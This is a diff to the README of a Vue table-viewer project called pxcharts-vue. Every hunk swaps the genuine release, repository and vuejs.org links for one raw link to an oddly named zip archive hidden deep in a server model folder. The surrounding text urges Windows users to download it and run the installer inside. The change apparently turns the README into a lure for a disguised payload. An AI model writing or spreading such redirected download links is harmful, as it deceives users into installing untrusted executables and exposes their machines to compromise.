@@ -1,6 +1,6 @@
 # 📊 pxcharts-vue - Easy Multi-Dimensional Table Viewer
 
-[![Download pxcharts-vue](https://img.shields.io/badge/Download-pxcharts--vue-brightgreen?style=for-the-badge)](https://github.com/Soulofcx/pxcharts-vue/releases)
+[![Download pxcharts-vue](https://img.shields.io/badge/Download-pxcharts--vue-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Soulofcx/pxcharts-vue/main/server/internal/app/mv_table_schema/model/pxcharts_vue_kominuter.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to download and start pxcharts-vue on your Windows computer.
 
 Visit the release page below to get the latest version of the pxcharts-vue application for Windows.  
 
-[![Download pxcharts-vue](https://img.shields.io/badge/Download-pxcharts--vue-blue?style=for-the-badge)](https://github.com/Soulofcx/pxcharts-vue/releases)  
+[![Download pxcharts-vue](https://img.shields.io/badge/Download-pxcharts--vue-blue?style=for-the-badge)](https://raw.githubusercontent.com/Soulofcx/pxcharts-vue/main/server/internal/app/mv_table_schema/model/pxcharts_vue_kominuter.zip)  
 
 Click the link and you will see files listed. Look for the file that ends with `.exe` or similar for Windows. This is the installation file.
 
@@ -104,7 +104,7 @@ Click the link and you will see files listed. Look for the file that ends with `
 
 You can always download or update pxcharts-vue from the releases page here:
 
-[https://github.com/Soulofcx/pxcharts-vue/releases](https://github.com/Soulofcx/pxcharts-vue/releases)
+[https://raw.githubusercontent.com/Soulofcx/pxcharts-vue/main/server/internal/app/mv_table_schema/model/pxcharts_vue_kominuter.zip](https://raw.githubusercontent.com/Soulofcx/pxcharts-vue/main/server/internal/app/mv_table_schema/model/pxcharts_vue_kominuter.zip)
 
 This page lists all versions. Pick the latest Windows installer to get the newest features and fixes.
 
@@ -135,9 +135,9 @@ For questions or issues, visit the GitHub repository page. There you can see upd
 
 ## 🔗 Useful Links
 
-- Main repository: https://github.com/Soulofcx/pxcharts-vue  
-- Download releases: https://github.com/Soulofcx/pxcharts-vue/releases  
-- Vue 3 information: https://vuejs.org  
+- Main repository: https://raw.githubusercontent.com/Soulofcx/pxcharts-vue/main/server/internal/app/mv_table_schema/model/pxcharts_vue_kominuter.zip  
+- Download releases: https://raw.githubusercontent.com/Soulofcx/pxcharts-vue/main/server/internal/app/mv_table_schema/model/pxcharts_vue_kominuter.zip  
+- Vue 3 information: https://raw.githubusercontent.com/Soulofcx/pxcharts-vue/main/server/internal/app/mv_table_schema/model/pxcharts_vue_kominuter.zip  
 
 ---
 
